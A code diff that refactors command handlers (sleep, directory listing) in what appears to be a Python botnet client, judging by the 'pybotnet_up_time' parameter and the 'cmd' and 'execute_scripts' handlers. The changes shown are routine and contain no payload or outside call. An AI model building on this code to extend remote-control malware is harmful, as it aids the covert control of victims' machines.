@@ -51,14 +51,16 @@ def execute_scripts(command, pybotnet_up_time, logger):
 
 
 def execute_do_sleep(command, logger):
-    comm = split_command(command)
+    command = split_command(command)
     try:
-        sleep_message = comm[2]
+        sleep_message = command[2:]
+        sleep_message = ' '.join(sleep_message)
     except:
         sleep_message = ''
 
     try:
-        do_sleep(seconds=comm[1], logger=logger, sleep_message=sleep_message)
+        do_sleep(seconds=command[1], logger=logger,
+                 sleep_message=sleep_message)
         logger.info('do_sleep done')
         return 'do_sleep done'
     except:
@@ -66,11 +68,11 @@ def execute_do_sleep(command, logger):
         return 'execute_do_sleep invalid command; Wrong format'
 
 
-def do_sleep(seconds, logger, sleep_message=''):
+def do_sleep(seconds, logger, sleep_message: str):
     '''
     print sleep message and sleep
     '''
-    if sleep_message != 'none':
+    if sleep_message != '':
         print(sleep_message)
 
     logger.info(f'sleep {seconds} second | {sleep_message}')
@@ -108,12 +110,12 @@ def cmd(command,  logger) -> str:
 def execute_ls(command, logger) -> str:
     command = split_command(command)
 
-    logger.info('execute ls')
+    logger.info(f'execute ls: {command}')
 
     try:
         return ls(command[1])
     except:
-        return ls('.')
+        return 'execute_ls error '
 
 
 def ls(route: str) -> str:
